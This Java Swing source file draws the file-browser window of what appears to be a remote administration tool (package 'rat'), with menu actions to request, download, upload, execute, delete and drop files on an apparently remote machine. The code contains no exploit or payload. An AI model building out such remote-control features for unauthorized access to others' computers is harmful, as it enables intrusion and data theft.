package de.sogomn.rat.gui;

import static de.sogomn.rat.util.Resources.LANGUAGE;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreePath;

import de.sogomn.engine.fx.SpriteSheet;
import de.sogomn.engine.util.AbstractListenerContainer;
import de.sogomn.engine.util.ImageUtils;

public final class FileTree extends AbstractListenerContainer<IGuiController> {
	
	private JFrame frame;
	private FileTreeNode root;
	private JTree tree;
	private DefaultTreeModel treeModel;
	private JScrollPane scrollPane;
	private JPopupMenu menu;
	
	private FileTreeNode nodeClicked;
	
	private static final Dimension SIZE = new Dimension(500, 500);
	private static final String ROOT_NAME = "";
	private static final String SEPARATOR_REGEX = "[\\\\\\/]";
	private static final BufferedImage[] MENU_ICONS = new SpriteSheet(ImageUtils.scaleImage(ImageUtils.loadImage("/gui_tree_icons.png"), 2), 16 * 2, 16 * 2).getSprites();
	
	public static final String REQUEST = LANGUAGE.getString("action.request_files");
	public static final String DOWNLOAD = LANGUAGE.getString("action.download");
	public static final String UPLOAD = LANGUAGE.getString("action.upload");
	public static final String EXECUTE = LANGUAGE.getString("action.execute");
	public static final String DELETE = LANGUAGE.getString("action.delete");
	public static final String NEW_DIRECTORY = LANGUAGE.getString("action.new_directory");
	public static final String DROP_FILE = LANGUAGE.getString("action.drop_file");
	public static final String INFORMATION = LANGUAGE.getString("action.file_information");
	
	private static final String[] COMMANDS = {
		REQUEST,
		DOWNLOAD,
		UPLOAD,
		EXECUTE,
		DELETE,
		NEW_DIRECTORY,
		DROP_FILE,
		INFORMATION
	};
	
	public FileTree() {
		frame = new JFrame();
		root = new FileTreeNode(ROOT_NAME);
		tree = new JTree(root);
		treeModel = (DefaultTreeModel)tree.getModel();
		scrollPane = new JScrollPane(tree, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		menu = new JPopupMenu();
		
		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
			final String command = COMMANDS[i];
			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
			
			addMenuItem(command, icon);
		}
		
		final MouseAdapter mouseAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final int x = m.getX();
				final int y = m.getY();
				final TreePath path = tree.getPathForLocation(x, y);
				
				tree.setSelectionPath(path);
				
				if (path != null) {
					nodeClicked = (FileTreeNode)path.getLastPathComponent();
				} else {
					nodeClicked = null;
				}
			}
		};
		
		scrollPane.setBorder(null);
		tree.addMouseListener(mouseAdapter);
		tree.setEditable(false);
		tree.setComponentPopupMenu(menu);
		
		frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		frame.setPreferredSize(SIZE);
		frame.setContentPane(scrollPane);
		frame.setIconImage(ImageUtils.EMPTY_IMAGE);
		frame.pack();
		frame.setLocationRelativeTo(null);
	}
	
	private void addMenuItem(final String name, final Icon icon) {
		final JMenuItem item = new JMenuItem(name);
		
		item.setActionCommand(name);
		item.addActionListener(this::menuItemClicked);
		item.setIcon(icon);
		
		menu.add(item);
	}
	
	private void menuItemClicked(final ActionEvent a) {
		final String command = a.getActionCommand();
		
		notifyListeners(controller -> controller.userInput(command, this));
	}
	
	public void reload() {
		treeModel.reload();
	}
	
	public void reload(final FileTreeNode node) {
		treeModel.reload(node);
	}
	
	public void addNodeStructure(final String... path) {
		FileTreeNode current = root;
		
		for (final String name : path) {
			final FileTreeNode next = current.getChild(name);
			
			if (next == null) {
				final FileTreeNode node = new FileTreeNode(name);
				
				treeModel.insertNodeInto(node, current, 0);
				
				current = node;
			} else {
				current = next;
			}
		}
	}
	
	public void addNodeStructure(final String path) {
		final String[] parts = path.split(SEPARATOR_REGEX);
		
		if (parts.length == 0) {
			final String[] part = {path};
			
			addNodeStructure(part);
		} else {
			addNodeStructure(parts);
		}
	}
	
	public void removeNode(final FileTreeNode node) {
		final FileTreeNode parent = node.getParent();
		
		treeModel.removeNodeFromParent(node);
		
		reload(parent);
	}
	
	public void removeChildren(final FileTreeNode node) {
		final FileTreeNode[] children = node.getChildren();
		
		for (final FileTreeNode child : children) {
			treeModel.removeNodeFromParent(child);
		}
		
		reload(node);
	}
	
	public void setVisible(final boolean visible) {
		frame.setVisible(visible);
	}
	
	public void close() {
		root.removeAllChildren();
		
		frame.setVisible(false);
		frame.dispose();
	}
	
	public void setTitle(final String title) {
		frame.setTitle(title);
	}
	
	public FileTreeNode getNodeClicked() {
		return nodeClicked;
	}
	
}
